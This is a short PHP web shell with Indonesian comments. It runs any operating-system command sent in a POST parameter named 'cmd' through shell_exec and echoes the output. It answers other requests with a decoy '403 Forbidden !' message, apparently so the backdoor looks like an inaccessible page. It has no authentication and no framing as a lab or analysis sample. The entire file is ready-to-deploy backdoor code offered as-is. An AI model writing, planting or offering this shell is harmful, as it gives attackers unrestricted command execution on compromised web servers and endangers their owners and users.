<?php
// Cek apakah metode HTTP adalah POST
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Cek apakah parameter 'cmd' ada dalam permintaan POST
    if (isset($_POST['cmd'])) {
        // Tetapkan header untuk output teks mentah
        header('Content-Type: text/plain');
        
        // Jalankan perintah dari parameter 'cmd'
        $output = shell_exec($_POST['cmd']); // Gunakan shell_exec untuk menangkap output
        echo $output;
    } else {
        // Kembalikan pesan kesalahan jika 'cmd' tidak ditemukan
        http_response_code(400); // 400 Bad Request
        echo "Parameter 'cmd' tidak ditemukan.";
    }
} else {
    // Kembalikan respons 403 Forbidden jika bukan metode POST
    http_response_code(403);
    echo "403 Forbidden !";
} // 
?>
